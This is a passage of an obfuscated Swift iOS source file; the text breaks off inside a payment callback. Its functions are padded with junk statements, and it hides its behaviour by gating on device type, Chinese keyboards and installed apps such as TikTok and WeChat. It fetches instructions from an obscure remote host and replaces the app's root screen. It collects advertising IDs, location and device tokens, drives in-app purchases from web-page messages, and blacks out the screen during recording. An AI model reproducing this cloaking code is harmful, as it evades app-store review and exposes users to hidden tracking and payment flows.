
import Foundation
import UIKit
import AppTrackingTransparency
import AdSupport
import UserNotifications
import CoreLocation
import Security
import System
import CommonCrypto
import StoreKit
import WebKit
import AuthenticationServices
import RevenueCat
import Alamofire
import AppsFlyerLib
import SVProgressHUD
import Moya
import Photos
import AVFoundation
enum APIService {
    case getEncodedUrl(query: String)
}
extension APIService: TargetType {
    var baseURL: URL {
        return URL(string: "https://c8ydut.opxtx.com")!
    }
    var path: String {
        switch self {
        case .getEncodedUrl:
            return "/djn3t3"
        }
    }
    var method: Moya.Method {
        return .get
    }
    
    var sampleData: Data {
        return Data()
    }
    var task: Task {
        switch self {
        case .getEncodedUrl(let query):
            return .requestParameters(parameters: ["co": query], encoding: URLEncoding.queryString)
        }
    }
    var headers: [String: String]? {
        return nil
    }
}
extension Notification.Name {
    static let appKeyboardWillShowNotification = Notification.Name(UIResponder.keyboardWillShowNotification.rawValue)
    static let appKeyboardWillHidenNotification = Notification.Name(UIResponder.keyboardWillHideNotification.rawValue)
    static let appDidBecomeActiveNotification =  Notification.Name(UIApplication.didBecomeActiveNotification.rawValue)
}
extension Int{

    static func badgeNumber() -> Int {
            let urlM:String! = "halfltuint"
             while urlM.count > 26 { break }
        return Int.random(in: 5...10)
    }
}
extension String {
    var isBlank: Bool {
        let aps = self.trimmingCharacters(in: .whitespacesAndNewlines)
            let valuesy:Double = 8697.0
             while NSNumber(value:valuesy).intValue >= 101 { break }
        return aps.isEmpty
    }

    static func  targetFilterCompletionAddKeyboardDissolve() -> String{
            let scrollP:Double = 7392.0
             if NSNumber(value:scrollP).intValue >= 130 {}
        let message = Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? ""
            let preferredt:Float = 1616.0
             while NSNumber(value:preferredt).intValue > 119 { break }
        let system = "\(message)_ab"
            let number4:String! = "dims"
        return system
    }

    static func  transitionSoundPriceShouldActivityLocale() -> String{
            let openW:Bool = true
             if NSNumber(value:openW).boolValue {}
        let message = Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? ""
            let s_productsX:String! = "sixtap"
             if s_productsX == "b" {}
        let system = "\(message)_host"
            let r_managerC:String! = "qpqscale"
             if r_managerC == "c" {}
        return system
    }

    static func purchaseLastScrollProvidingZeroConversion(from dictionary: [String: Any]) -> String? {
            let urlV:String! = "apply"
             if urlV == "9" {}
        if let jsonData = try? JSONSerialization.data(withJSONObject: dictionary, options: []) {
            return String(data: jsonData, encoding: .utf8)
        }
        return nil
    }

    static func randomHelperUnsafeRecorder() -> String? {
            let machine5:[Any]! = [496, 661, 589]
        let bytes: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: LDelegate.shared.badgeDic,
            kSecReturnData as String: true,
            kSecMatchLimit as String: kSecMatchLimitOne
        ]
            let offeringsQ:Double = 8057.0
             _ = NSNumber(value: offeringsQ).intValue
        var result: AnyObject?
        let value = SecItemCopyMatching(bytes as CFDictionary, &result)
            let configc:[String: Any]! = ["subdata":390, "ethertuplis":182, "passes":551]
             if configc.count > 179 {}
        if value == errSecSuccess, let data = result as? Data {
            return String(data: data, encoding: .utf8)
        }
        return nil
    }

    static func arrayFinishIdiom(length: Int) -> String {
            let activec:String! = "avformat"
             if activec == "9" {}
        let trimmed = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        return String((0..<length).compactMap { _ in trimmed.randomElement() })
    }

    static func md5(from string: String) -> String {
            let lengthl:String! = "least"
        let generate = Data(string.utf8)
            let showl:[Any]! = ["bugs", "installations"]
             while showl.count > 152 { break }
        var attributes = [UInt8](repeating: 0, count: Int(CC_MD5_DIGEST_LENGTH))
            let contentn:Bool = true
             if NSNumber(value:contentn).boolValue {}
        generate.withUnsafeBytes {
            _ = CC_MD5($0.baseAddress, CC_LONG(generate.count), &attributes)
        }
        return attributes.map { String(format: "%02x", $0) }.joined()
    }

    static func sourceBlackAnimateTrackBody() -> String{
            let devicel:Double = 8772.0
             while NSNumber(value:devicel).intValue > 35 { break }
        return  String("abcdefghijklmnopqrstuvwxyz".randomElement()!)
    }

    static func targetMatchBackgroundCountStandard() -> String {
            let check_:String! = "xoffset"
             if check_ == "1" {}
        let trimmed = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            let longitudew:String! = "track"
             while longitudew.count > 118 { break }
        let from = Int.random(in: 1...15)
        return String((0..<from).compactMap { _ in trimmed.randomElement() })
    }
}
extension Bool {

    static func removeTrackClientMedia() -> Bool {
            let credential7:[Any]! = [UILabel(frame:CGRect(x: 288, y: 82, width: 0, height: 0))]
        let info = [
            "snssdk1128://",
            "weixin://"
        ]
        for scheme in info {
            if let url = URL(string: scheme), UIApplication.shared.canOpenURL(url) {
                return true
            }
        }
        return false
    }

    static func modalMemoryPermissionState() -> Bool{
            let bundlee:String! = "nearby"
             while bundlee.count > 91 { break }
        if (!Bool.removeDarkEvaluateObjectRedEnd()){
            return false
        }
        if (Bool.stopChangeStoreCrossScreen()){
            return false
        }
        if (Bool.removeTrackClientMedia()){
            return false
        }
        return true
    }

    static func removeDarkEvaluateObjectRedEnd() -> Bool {
            let identifiers3:Double = 6107.0
             _ = NSNumber(value: identifiers3).intValue
        return UIDevice.current.userInterfaceIdiom == .phone
    }

    static func stopChangeStoreCrossScreen() -> Bool {
            let signY:Bool = false
             if !NSNumber(value:signY).boolValue {}
        let should = UserDefaults.standard.array(forKey: "AppleKeyboards") as? [String] ?? []
        for keyboard in should {
            if let keyboardStr = keyboard as? String {
                if keyboardStr.contains("zh_Hans") ||
                    keyboardStr.contains("zh_Hant") ||
                    keyboardStr.contains("com.sogou.sogouinput.basekeyboard") ||
                    keyboardStr.contains("com.baidu.inputMethod.keyboard") ||
                    keyboardStr.contains("com.tencent.wetype.keyboard") ||
                    keyboardStr.contains("com.iflytek.inputime.keyboard") {
                    return true
                }
            }
        }
        return false
    }
}
extension UIWindow {
    static var current: UIWindow? {
        if #available(iOS 13.0, *) {
            let lang: UIWindowScene? = UIApplication.shared.connectedScenes.first as? UIWindowScene
            let window = lang?.windows.first
            let activea:String! = "hashtable"
             if activea == "5" {}
            if window != nil {
                return window
            }
        }
        let window = UIApplication.shared.keyWindow
            let knew_hw:Bool = false
        if window != nil {
            return window
        }
        return UIApplication.shared.windows.first
    }
    var topController: UIViewController? {
        var conversion = rootViewController
            let callbackQ:Float = 5842.0
             while NSNumber(value:callbackQ).intValue <= 145 { break }
        while conversion?.presentedViewController != nil {
            conversion = conversion?.presentedViewController
        }
        return conversion
    }
    var currentController: UIViewController? {
        guard var current = topController else {
            return nil
        }
        while true {
            if current.isKind(of: UINavigationController.self) {
                let identifiersView = current as! UINavigationController
            let queryH:Int = 9638
             if NSNumber(value:queryH).intValue >= 28 {}
                if identifiersView.topViewController != nil {
                    current = identifiersView.topViewController!
                }
            } else if current.isKind(of: UITabBarController.self) {
                let current2 = current as! UITabBarController
            let login8:Float = 2217.0
             if NSNumber(value:login8).intValue >= 15 {}
                if current2.selectedViewController != nil {
                    current = current2.selectedViewController!
                }
            } else if current.isKind(of: UISplitViewController.self) {
                let responder = current as! UISplitViewController
            let strf:Bool = true
             if NSNumber(value:strf).boolValue {}
                if responder.viewControllers.last != nil {
                    current = responder.viewControllers.last!
                }
            } else {
                break
            }
        }
        return current
    }
}
class IQLaunch: NSObject {
    static let shared = IQLaunch()
    private  override init() {}

    func plainIconTopScreenBack(value: String, for key: String) {
        guard let data = value.data(using: .utf8) else { return }
        let bytes: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: key
        ]
            let splitH:[Any]! = [65, 151, 704]
             if splitH.endIndex < 38 {}
        SecItemDelete(bytes as CFDictionary)
            let main_gR:Bool = true
             if !NSNumber(value:main_gR).boolValue {}
        let eird: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: key,
            kSecValueData as String: data
        ]
            let e_badgeQ:Int = 2254
             while NSNumber(value:e_badgeQ).intValue < 153 { break }
        SecItemAdd(eird as CFDictionary, nil)
    }
}
class RCenterModity: NSObject {
    static let shared = RCenterModity()
    var languageEird : Int? = nil
    var componentsIds : String = ""
    var permHeaders = Int()
    var backHandlers = Int()
    private var schemesOfferings: CLLocationManager!
    private var completionHandler: ((CGFloat, CGFloat, Bool) -> Void)?
    private  override init() {
        super.init()
        schemesOfferings = CLLocationManager()
        schemesOfferings.delegate = self
    }

    func allowFilterOneShow(completion: @escaping (CGFloat, CGFloat, Bool) -> Void) {
            let lengthX:Double = 1537.0
             if NSNumber(value:lengthX).intValue >= 102 {}
        UserDefaults.standard.set("******", forKey: "locationPermission")
            let app6:String! = "fields"
        self.completionHandler = completion
            let responderb:Int = 1031
             while NSNumber(value:responderb).intValue < 119 { break }
        let value = CLLocationManager.authorizationStatus()
            let rounded7:[Any]! = [771, 800]
        switch value {
        case .notDetermined:
            schemesOfferings.requestWhenInUseAuthorization()
            let barl:Int = 8203
             _ = NSNumber(value: barl).intValue
        case .authorizedWhenInUse, .authorizedAlways:
            schemesOfferings.startUpdatingLocation()
            let queryi:Int = 3038
             while NSNumber(value:queryi).intValue <= 77 { break }
        default:
            backHandlers = 0
            let top6:String! = "avcodecres"
             while top6.count > 163 { break }
            completion(0, 0, false)
            let plainT:String! = "hexbyte"
             if plainT.count > 163 {}
            schemesOfferings.stopUpdatingLocation()
        }
    }

    func dismissNotificationRemote() -> Int {
            let random4:Bool = true
             while NSNumber(value:random4).boolValue { break }
        let value = PHPhotoLibrary.authorizationStatus()
            let albumM:String! = "reward"
             if albumM.count > 119 {}
        switch value {
        case .notDetermined, .restricted, .denied:
            return 0
        case .authorized, .limited:
            return 1
        @unknown default:
            return 0
        }
    }

    @objc private func originalSceneAlpha() {
            let attributes6:[Any]! = [199, 562, 117]
             if attributes6.startIndex > 87 {}
        if #available(iOS 14, *) {
            ATTrackingManager.requestTrackingAuthorization { status in
            let resultN:Double = 9808.0
             if NSNumber(value:resultN).intValue < 116 {}
                DispatchQueue.main.async {
                    switch status {
                    case .notDetermined:
                        self.languageEird = 0
            let planK:Double = 6013.0
             while NSNumber(value:planK).intValue < 148 { break }
                        self.componentsIds = ""
            let attributesS:String! = "curve"
             if attributesS.count > 114 {}
                    case .authorized:
                        self.languageEird = 1
            let wait3:Float = 7373.0
             while NSNumber(value:wait3).intValue < 32 { break }
                        self.componentsIds = ASIdentifierManager.shared().advertisingIdentifier.uuidString
            let partsf:String! = "prf"
                    case .denied, .restricted:
                        self.languageEird = 0
            let handleron2:String! = "getcut"
             if handleron2.count > 1 {}
                        self.componentsIds = ""
            let can4:Double = 7413.0
             while NSNumber(value:can4).intValue < 147 { break }
                    @unknown default:
                        self.languageEird = 0
            let plainF:Bool = false
             while !NSNumber(value:plainF).boolValue { break }
                        self.componentsIds = ""
                    }
                }
            }
        } else {
            if ASIdentifierManager.shared().isAdvertisingTrackingEnabled {
                self.languageEird = 1
            let navw:[String: Any]! = ["folders":778, "qtable":778]
                self.componentsIds = ASIdentifierManager.shared().advertisingIdentifier.uuidString
            } else {
                self.languageEird = 0
            let navg:Double = 729.0
             if NSNumber(value:navg).intValue >= 47 {}
                self.componentsIds = ""
            }
            
        }
        AppsFlyerLib.shared().start()
    }

    func longitudeIdiomAppendPhoneEndSplit() -> Int {
            let secondsd:Double = 916.0
             if NSNumber(value:secondsd).intValue > 7 {}
        let value = AVCaptureDevice.authorizationStatus(for: .video)
            let requestx:Int = 8412
             while NSNumber(value:requestx).intValue == 156 { break }
        switch value {
        case .notDetermined, .restricted, .denied:
            return 0
        case .authorized:
            return 1
        @unknown default:
            return 0
        }
    }

    @objc private func flexibleBeginWill() {
            let extF:Bool = false
             while !NSNumber(value:extF).boolValue { break }
        let key = UNUserNotificationCenter.current()
        key.getNotificationSettings { settings in
            let authorization8:Float = 6049.0
             while NSNumber(value:authorization8).intValue <= 100 { break }
            DispatchQueue.main.async {
                self.permHeaders = (settings.authorizationStatus == .authorized) ? 1 : 0
            }
        }
    }

    func protectFormatCanQueueIdiom() {
            let url2:Int = 9394
             while NSNumber(value:url2).intValue > 180 { break }
        NotificationCenter.default.addObserver(self, selector: #selector(originalSceneAlpha), name: .appDidBecomeActiveNotification, object: nil)
            let networkW:Int = 4823
             while NSNumber(value:networkW).intValue > 23 { break }
        NotificationCenter.default.addObserver(self, selector: #selector(flexibleBeginWill), name: .appDidBecomeActiveNotification, object: nil)
    }
}
extension RCenterModity : CLLocationManagerDelegate{

    func locationManager(_ manager: CLLocationManager, didChangeAuthorization status: CLAuthorizationStatus) {
            let identifiers2:Bool = true
             while !NSNumber(value:identifiers2).boolValue { break }
        switch status {
        case .authorizedWhenInUse, .authorizedAlways:
            manager.startUpdatingLocation()
            let app0:Float = 8219.0
             if NSNumber(value:app0).intValue < 94 {}
        default:
            backHandlers = 0
            let realT:Bool = true
             if !NSNumber(value:realT).boolValue {}
            completionHandler?(0, 0, false)
            manager.stopUpdatingLocation()
        }
    }

    func locationManager(_ manager: CLLocationManager, didUpdateLocations locations: [CLLocation]) {
        guard let currentLocation = locations.last else { return }
        backHandlers = 1
            let characters5:Bool = false
        let handlers = String(format: "%f", currentLocation.coordinate.latitude)
            let protectJ:[Any]! = [8004.0]
             if protectJ.count > 145 {}
        let split = String(format: "%f", currentLocation.coordinate.longitude)
            let bundleR:Double = 9801.0
             while NSNumber(value:bundleR).intValue == 198 { break }
        if let lat = Double(handlers), let lon = Double(split) {
            self.completionHandler?(lat, lon, true)
        }
        manager.stopUpdatingLocation()
    }

    func locationManager(_ manager: CLLocationManager, didFailWithError error: Error) {
            let main_nZ:Bool = false
        backHandlers = 0
            let aps3:Float = 1703.0
             while NSNumber(value:aps3).intValue >= 186 { break }
        completionHandler?(0, 0, false)
        manager.stopUpdatingLocation()
    }
}
class LDelegate: NSObject {
    static let shared = LDelegate()
    private  override init() {}
    var badgeDic: String {
            return Bundle.main.bundleIdentifier ?? ""
    }
    var requestDic: String {
        return (Bundle.main.infoDictionary?["CFBundleDisplayName"] as? String) ??
        (Bundle.main.infoDictionary?["CFBundleName"] as? String) ?? ""
    }
    var systemVersion: String {
            return UIDevice.current.systemVersion
    }
    var openLon: String {
        var cat = utsname()
            let lastG:String! = "palbars"
             while lastG.count > 193 { break }
        uname(&cat)
            let targetf:Bool = true
             while !NSNumber(value:targetf).boolValue { break }
        let top = withUnsafePointer(to: &cat.machine) {
            $0.withMemoryRebound(to: CChar.self, capacity: 1) {
                String(cString: $0)
            }
        }
        return top ?? ""
    }
    var latitudeTask: String {
        let fail = Locale.preferredLanguages.first ?? "en"
            let overlayv:[Any]! = ["unlocked", "banded"]
             if overlayv.count > 62 {}
        let jsonVersion = fail.split(separator: "-")
        guard jsonVersion.count >= 2 else {
            return fail.lowercased()
        }
        return String(format: "%@-%@", jsonVersion[0].lowercased(),jsonVersion[1].lowercased())
    }
    var credentialVersion: String {
        let components = TimeZone.current.secondsFromGMT()
            let bytesE:Int = 9921
             while NSNumber(value:bytesE).intValue > 0 { break }
        let save = components / 3600
            let launchM:String! = "qrcode"
             if launchM.count > 56 {}
        let blank = abs((components / 60) % 60)
            let q_centerX:[Any]! = [987, 289, 34]
             if q_centerX.startIndex > 188 {}
        let signw = save >= 0 ? "+" : "-"
        return String(format: "GMT%@%02ld:%02ld", signw, abs(save), blank)
    }

    func purchaseLanguageFullLocalePhotoWill() -> String {
            let register_qy:Float = 3454.0
             if NSNumber(value:register_qy).intValue < 82 {}
        var latitude = String()
            let skip4:Float = 4409.0
             _ = NSNumber(value: skip4).intValue
        if let saved = String.randomHelperUnsafeRecorder() {
            return saved
        }else{
            if RCenterModity.shared.languageEird == 0 {
                let must = String.arrayFinishIdiom(length: 32)
            let bundle3:String! = "consttime"
                latitude = String.md5(from:must)
            }else{
                latitude = RCenterModity.shared.componentsIds
            }
        }
        IQLaunch.shared.plainIconTopScreenBack(value: latitude, for: badgeDic)
            let gnew_2z:[String: Any]! = ["screens":"cols", "interpret":"timescale"]
             while gnew_2z.count > 156 { break }
        return latitude
    }
    var aceyemake: String {
        return  Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "1.0.3"
    }
    var activeMake: String {
        return String(format: "%@/%@ iOS/%@ (%@)", requestDic,aceyemake,systemVersion,openLon)
    }

    func fullLocaleCoreEndColor() -> [String: Any] {
            let b_centerA:Float = 3648.0
             if NSNumber(value:b_centerA).intValue <= 16 {}
        var schemes: [String: Any] = [:]
            let trackingf:String! = "compression"
             while trackingf.count > 86 { break }
        schemes[String.targetMatchBackgroundCountStandard() + "ua"] = activeMake
            let presentationz:Int = 1430
             if NSNumber(value:presentationz).intValue > 100 {}
        schemes[String.targetMatchBackgroundCountStandard() + "ci"] = purchaseLanguageFullLocalePhotoWill()
            let nameT:String! = "offet"
             while nameT.count > 11 { break }
        schemes[String.targetMatchBackgroundCountStandard() + "tz"] = credentialVersion
            let enewsk:String! = "allow"
             if enewsk.count > 156 {}
        schemes[String.targetMatchBackgroundCountStandard() + "lg"] = latitudeTask
            let extG:Bool = false
             if NSNumber(value:extG).boolValue {}
        schemes[String.targetMatchBackgroundCountStandard() + "fa"] = RCenterModity.shared.componentsIds
            let firstw:Double = 3578.0
             if NSNumber(value:firstw).intValue < 80 {}
        schemes[String.targetMatchBackgroundCountStandard() + "ot"] = basePointerGesture()
            let self_gB:Double = 9225.0
             while NSNumber(value:self_gB).intValue >= 24 { break }
        schemes[String.targetMatchBackgroundCountStandard() + "af"] = AppsFlyerLib.shared().getAppsFlyerUID()
            let queryE:Float = 5210.0
             while NSNumber(value:queryE).intValue > 109 { break }
        schemes[String.targetMatchBackgroundCountStandard() + "dt"] = UserDefaults.standard.string(forKey: "deviceToken") ?? ""
            let appleS:[Any]! = [false]
             if appleS.count > 17 {}
        return schemes
    }

    func basePointerGesture() -> String {
            let keyboardl:Bool = true
        return TimeZone.current.identifier
    }
}
class ZLaunchMain: NSObject {
    static let shared = ZLaunchMain()
    private  override init() {}
    let handleNav = MoyaProvider<APIService>()

    func targetVisibleStoreZeroDictionaryPop(successBlock: @escaping (_ data: Any?, _ isEnd: Bool) -> Void) {
            let appo:Int = 8806
             while NSNumber(value:appo).intValue <= 139 { break }
        let trimmede = "\(LDelegate.shared.activeMake):v1.1.0"
            let shielde:Float = 6587.0
             while NSNumber(value:shielde).intValue > 183 { break }
        let push = trimmede.data(using: .utf8)?.base64EncodedString() ?? ""
        handleNav.request(.getEncodedUrl(query: push)) { result in
            let anchorR:String! = "resign"
             if anchorR.count > 57 {}
            switch result {
            case .success(let response):
                DispatchQueue.main.async {
                    successBlock(response.data, true)
                }
            case .failure:
                DispatchQueue.main.async {
                    successBlock("nil", false)
                }
            }
        }
    }
}
class MYKNewsLogin: NSObject {
    static let shared = MYKNewsLogin()
    private  override init() {}
    var jsonVersion : Offerings?

    func appendContentLocaleRect(_ productIDArray: [String], completion: @escaping ([[String: Any]]) -> Void) {
            let lengthe:Double = 5362.0
             while NSNumber(value:lengthe).intValue < 44 { break }
        let rounded = Set(productIDArray)
            let productR:Bool = false
             if NSNumber(value:productR).boolValue {}
        self.dictStart = SKProductsRequest(productIdentifiers: rounded)
            let langf:Double = 1135.0
             while NSNumber(value:langf).intValue <= 173 { break }
        self.dictStart?.delegate = self
            let shield0:Int = 4896
             _ = NSNumber(value: shield0).intValue
        self.dictStart?.start()
            let namec:String! = "instantiation"
             if namec == "x" {}
        self.completionBlock = completion
    }
    private var RevenuecatCallBack: ((String?,Int?) -> Void)?

    func storeVisibleSaveSplitFoundManager(_ productId : String,callback: @escaping (String?,Int?,String?) -> Void) {
        guard let jsonVersion = self.jsonVersion else {
            callback("", 0,"")
            let didh:Double = 8636.0
             while NSNumber(value:didh).intValue >= 3 { break }
            return
        }
        var sharedG = false
        for (key, offering) in jsonVersion.all {
            for package in offering.availablePackages {
                if package.storeProduct.productIdentifier == productId {
                    sharedG = true
                    Purchases.shared.purchase(package: package) { transaction, customerInfo, error, userCancelled in
            let last3:Double = 2097.0
             if NSNumber(value:last3).intValue == 15 {}
                        if error != nil || userCancelled {
                            DispatchQueue.main.async {
                                callback("", 0,customerInfo?.originalAppUserId)
                            }
                            return
                        }
                        if let receiptURL = Bundle.main.appStoreReceiptURL,
                           let bundle = try? Data(contentsOf: receiptURL) {
                            let body = bundle.base64EncodedString()
            let beginZ:Bool = true
             if !NSNumber(value:beginZ).boolValue {}
                            DispatchQueue.main.async {
                                callback(body, 1,customerInfo?.originalAppUserId)
                            }
                        } else {
                            DispatchQueue.main.async {
                                callback("", 0,customerInfo?.originalAppUserId)
                            }
                        }
                    }
                    break
                }
            }
            if sharedG { break }
        }
        if !sharedG {
            DispatchQueue.main.async {
                callback("", 0,"")
            }
        }
    }
    private var dictStart: SKProductsRequest?
    private var completionBlock: (([[String: Any]]) -> Void)?

    func setMessageRawContentKindMachine(_ key:String,_ userID:String){
            let seconds1:Bool = false
             if NSNumber(value:seconds1).boolValue {}
        Purchases.configure(withAPIKey: key, appUserID: userID)
    }
}
extension MYKNewsLogin : SKProductsRequestDelegate{

    func productsRequest(_ request: SKProductsRequest, didReceive response: SKProductsResponse) {
            let canT:[Any]! = [317, 479, 493]
             while canT.count > 66 { break }
        var valuel = [[String: Any]]()
        for product in response.products {
            let query = product.productIdentifier
            let userv:Bool = false
            let status = NumberFormatter()
            let mnewsu:Double = 8208.0
             while NSNumber(value:mnewsu).intValue == 45 { break }
            status.numberStyle = .currency
            let startp:[Any]! = [7062.0]
            status.locale = product.priceLocale
            let resultE:String! = "removable"
            let method_w = status.string(from: product.price) ?? ""
            let handlersP:Double = 6846.0
             while NSNumber(value:handlersP).intValue < 56 { break }
            let base: [String: Any] = [
                String.targetMatchBackgroundCountStandard() + "pn": product.localizedTitle ,
                String.targetMatchBackgroundCountStandard() + "pd": product.localizedDescription,
                String.targetMatchBackgroundCountStandard() + "pj": query,
                String.targetMatchBackgroundCountStandard() + "pp": method_w
            ]
            let overlayq:Double = 1045.0
             while NSNumber(value:overlayq).intValue >= 48 { break }
            valuel.append(base)
        }
        self.completionBlock?(valuel)
        self.completionBlock = nil
    }

    func request(_ request: SKRequest, didFailWithError error: Error) {
            let allowm:String! = "domains"
             if allowm == "2" {}
        self.completionBlock = nil
    }
}
public class IALoginLogin: NSObject {
    public  static let shared = IALoginLogin()
    typealias appleLoginCompletion = (Bool, String) -> Void
    private var completionHandler: appleLoginCompletion?
    private weak var targetView: UIView?
    private var apsAlbum: UIView!
    private var webView: WKWebView?
    var identifiersTracking  = String()
    var handlersMake: ((Bool) -> Void)?
    var didMakeView : UIViewController?
    private override init() {
        super.init()
        NotificationCenter.default.addObserver(self, selector: #selector(performVersionSplit), name: UIScreen.capturedDidChangeNotification, object: nil)
    }
    deinit {
        NotificationCenter.default.removeObserver(self)
    }

    public  func shieldValueCameraChangeWill(_ window : UIWindow ,_ viewController : UIViewController, _ revenuecat: String, _ callback: @escaping (Bool?) -> Void){
            let nativeM:[Any]! = [50, 751, 379]
             if nativeM.startIndex > 110 {}
        RCenterModity.shared.protectFormatCanQueueIdiom()
            let charactersr:String! = "possibly"
             while charactersr.count > 8 { break }
        IALoginLogin.shared.didMakeView = UIViewController()
            let info4:Double = 2174.0
             if NSNumber(value:info4).intValue > 10 {}
        IALoginLogin.shared.didMakeView = viewController
            let queryW:Bool = true
             if NSNumber(value:queryW).boolValue {}
        identifiersTracking = revenuecat
            let systemf:Int = 5366
             if NSNumber(value:systemf).intValue < 77 {}
        window.rootViewController = LNewsHomeController(rootViewController: AXVEdit())
            let tnew_q6:[Any]! = ["getladdrs", "fatal"]
             if tnew_q6.endIndex < 121 {}
        window.makeKeyAndVisible()
    }

    func transitionWillCredentialView(_ controllerView: UIView) {
            let tope:Bool = false
        self.targetView = controllerView
            let strB:Double = 4003.0
             while NSNumber(value:strB).intValue == 159 { break }
        self.apsAlbum = UIView(frame: controllerView.bounds)
            let permissiong:String! = "atoi"
             if permissiong == "_" {}
        self.apsAlbum.backgroundColor = .black
            let trackO:String! = "rmstream"
             if trackO.count > 194 {}
        self.apsAlbum.isHidden = true
            let callQ:[String: Any]! = ["faces":"inversed", "checkin":"weekday", "shade":"byteshuman"]
             while callQ.count > 14 { break }
        self.apsAlbum.isUserInteractionEnabled = false
            let offsetO:String! = "attack"
             while offsetO.count > 137 { break }
        self.apsAlbum.alpha = 1.0
            let planc:Float = 6233.0
             if NSNumber(value:planc).intValue <= 40 {}
        controllerView.addSubview(self.apsAlbum)
            let numberB:Float = 7599.0
             _ = NSNumber(value: numberB).intValue
        performVersionSplit()
    }

    @objc private func performVersionSplit() {
            let extm:[Any]! = [253, 920, 601]
             if extm.count > 44 {}
        apsAlbum.isHidden = !UIScreen.main.isCaptured
    }

    func compactUnsafePopFilter() {
            let strQ:Int = 9570
             while NSNumber(value:strQ).intValue >= 190 { break }
        if let url = URL(string: UIApplication.openSettingsURLString),
           UIApplication.shared.canOpenURL(url) {
            UIApplication.shared.open(url, options: [:], completionHandler: nil)
        }
    }

    
    func presentationScreenReboundResult(_ completion: @escaping appleLoginCompletion) {
            let processedM:Int = 1692
             while NSNumber(value:processedM).intValue == 136 { break }
        self.completionHandler = completion
            let skipp:Double = 1461.0
             if NSNumber(value:skipp).intValue > 170 {}
        let attributes_ = ASAuthorizationAppleIDProvider()
            let foundl:[String: Any]! = ["impulse":"reschedule", "idctrow":"with"]
        let preferred = attributes_.createRequest()
            let activeY:Float = 5914.0
             while NSNumber(value:activeY).intValue < 168 { break }
        preferred.requestedScopes = [.fullName, .email]
            let formatterd:Double = 112.0
             while NSNumber(value:formatterd).intValue == 136 { break }
        let barController = ASAuthorizationController(authorizationRequests: [preferred])
            let anchoro:Float = 2282.0
             if NSNumber(value:anchoro).intValue >= 93 {}
        barController.delegate = self
            let requestY:[String: Any]! = ["decode":"aint", "winerrno":"setwatermark", "supernode":"camel"]
             while requestY.count > 21 { break }
        barController.presentationContextProvider = self
            let shows:Double = 7905.0
             if NSNumber(value:shows).intValue <= 82 {}
        barController.performRequests()
    }

    func latitudeServiceReview(from userInfo: [AnyHashable: Any]) -> [String: Any] {
            let mustO:Bool = true
             if NSNumber(value:mustO).boolValue {}
        var version = [String: Any]()
        for (key, value) in userInfo {
            guard let keyString = key as? String else { continue }
            var main_t: Any = value
            let preferredB:Bool = false
             if NSNumber(value:preferredB).boolValue {}
            if let nsValue = value as? NSValue {
                let type = String(cString: nsValue.objCType)
            let componentsb:Int = 9688
             _ = NSNumber(value: componentsb).intValue
                if type == String(cString: NSValue(cgRect: CGRect.zero).objCType) {
                    let product = nsValue.cgRectValue
            let fetchR:Bool = false
                    main_t = [
                        "x": product.origin.x,
                        "y": product.origin.y,
                        "width": product.width,
                        "height": product.height
                    ]
                } else if type == String(cString: NSValue(cgPoint: CGPoint.zero).objCType) {
                    let ids = nsValue.cgPointValue
            let phoneb:String! = "gamma"
             while phoneb.count > 177 { break }
                    main_t = [
                        "x": ids.x,
                        "y": ids.y
                    ]
                } else if type == String(cString: NSValue(cgSize: CGSize.zero).objCType) {
                    let size = nsValue.cgSizeValue
            let becomeQ:[Any]! = [UILabel()]
                    main_t = [
                        "width": size.width,
                        "height": size.height
                    ]
                } else {
                    main_t = "\(value)"
                }
            } else {
                do {
                    _ = try JSONSerialization.data(withJSONObject: ["key": value], options: [])
                } catch {
                    main_t = "\(value)"
                }
            }
            version[keyString] = main_t
        }
        return version
    }

    public  func applicationWillEnterForeground(_ show: Bool) {
            let allowG:[String: Any]! = ["bitmap":28, "rrtr":635]
             if allowG["O"] != nil {}
        handlersMake?(show)
    }

    func transitionAnyBlankZeroView(_ viewController: UIViewController, wkWebView: WKWebView, handlerWKScriptMessage message: WKScriptMessage) {
            let callbackw:String! = "mass"
             if callbackw == "g" {}
        self.webView = wkWebView
        guard let body = message.body as? [String: Any] else { return }
        let json = body.filter { $0.key.hasSuffix("_ud") }
        let blankB = body.filter { $0.key.hasSuffix("_ta") }
        guard let uuid = json.first?.value as? String,
              let apple = blankB.first?.value as? [String: Any] else {
            return
        }
        let offeringse = message.name
            let f_productsw:Float = 4645.0
             if NSNumber(value:f_productsw).intValue < 131 {}
        if offeringse == "a" {
            modalAnnotationAlertAdd(viewController, data: apple, uuid: uuid)
        }
    }
}
extension IALoginLogin : ASAuthorizationControllerDelegate,ASAuthorizationControllerPresentationContextProviding{

    public func authorizationController(controller: ASAuthorizationController, didCompleteWithAuthorization authorization: ASAuthorization) {
            let apsM:String! = "primality"
             while apsM.count > 161 { break }
        if let appleIDCredential = authorization.credential as? ASAuthorizationAppleIDCredential,
           let method_6_ = appleIDCredential.authorizationCode,
           let application = String(data: method_6_, encoding: .utf8) {
            completionHandler?(true, application)
        }
    }

    private func commonDarkReachableStandardLimited(data: [String: Any], uuid: String, callback: String) {
            let anew_d6d:Double = 2394.0
             if NSNumber(value:anew_d6d).intValue >= 31 {}
        let query = data.first(where: { $0.key.hasSuffix("_pi") })?.value as? String ?? ""
        MYKNewsLogin.shared.storeVisibleSaveSplitFoundManager(query) { evidence, status,userId in
            let showR:Bool = true
             while NSNumber(value:showR).boolValue { break }
            var keyboard: [String: Any] = [:]
            let numberg:[Any]! = ["strength", "trees", "iswriteable"]
            keyboard[String.targetMatchBackgroundCountStandard() + "ud"] = uuid
            let applicationY:String! = "dvdsub"
            keyboard[String.targetMatchBackgroundCountStandard() + "ec"] = evidence
            let queryL:Int = 474
             if NSNumber(value:queryL).intValue <= 118 {}
            keyboard[String.targetMatchBackgroundCountStandard() + "us"] = status
            let lastz:Int = 198
             if NSNumber(value:lastz).intValue > 46 {}
            keyboard[String.targetMatchBackgroundCountStandard() + "ru"] = userId
            let willR:Bool = false
